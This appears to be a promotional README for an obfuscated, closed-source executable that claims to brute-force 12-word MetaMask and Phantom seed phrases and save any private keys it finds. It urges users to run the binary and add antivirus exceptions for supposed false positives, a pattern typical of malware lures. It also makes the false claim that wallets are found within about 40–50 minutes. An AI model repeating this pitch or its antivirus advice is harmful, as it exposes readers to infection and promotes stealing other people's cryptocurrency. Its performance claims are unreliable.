- A High-Speed Brute-Forcer Tool for Wallet Recovery

This Python-based tool efficiently brute-forces 12-word seed phrases (mnemonics) for MetaMask and Phantom wallets. It leverages multithreading and proxy support to accelerate the discovery process. Upon finding a valid seed, the program saves wallet details (address, private key, and seed phrase) to found_wallets.txt.

‚ö†Ô∏è Note:

Not open-source: Proprietary optimization methods are used.<br/>
Antivirus alerts: Rare false positives may occur due to code obfuscation and packaging.<br/>

:heavy_check_mark: Key Features

1) Multi-Wallet Support:
Compatible with MetaMask and Phantom wallets.

2) Multithreading:
Processes multiple seed combinations concurrently (user-defined threads).

3) Proxy Integration:
Route requests through proxies to avoid IP bans (HTTP/SOCKS supported).

4) Automated Saving:
Outputs discovered wallets to found_wallets.txt in real-time.

:pencil: Usage Instructions

1) Run the executable.

2) Select a wallet: Choose MetaMask or Phantom (or both).

3) Configure Threads.

4) Proxy Setup (Optional):<br/>
Enable the "Use Proxy" checkbox.<br/>
Enter your proxy URL (e.g. http://user:pass@ip:port).

5) Click Start and wait. The process may take hours/days.

‚è≥ Typical Workflow:

First wallet found in 40‚Äì50 minutes (as demonstrated in the YouTube video).

Do not interrupt the process‚Äîresults are saved live.

:point_down: Important Notes

1) Patience Required:<br/>
Brute-forcing 12-word seeds is computationally intensive. Expect extended runtimes.

2) Hardware Recommendations:<br/>
Use a machine with high CPU cores for optimal multithreading.

3) Proxy Advisory:<br/>
Proxies prevent rate-limiting but may slow down requests. Use reliable providers.

4) Security Warnings:<br/>
Use responsibly: Only test wallets you own.<br/>
Antivirus: Add exceptions if false positives occur.<br/>

üìå Final Advice:

Let the tool run uninterrupted.<br/>
Verify found_wallets.txt periodically.<br/>
Never share recovered seeds privately!<br/>

Good luck! üöÄ
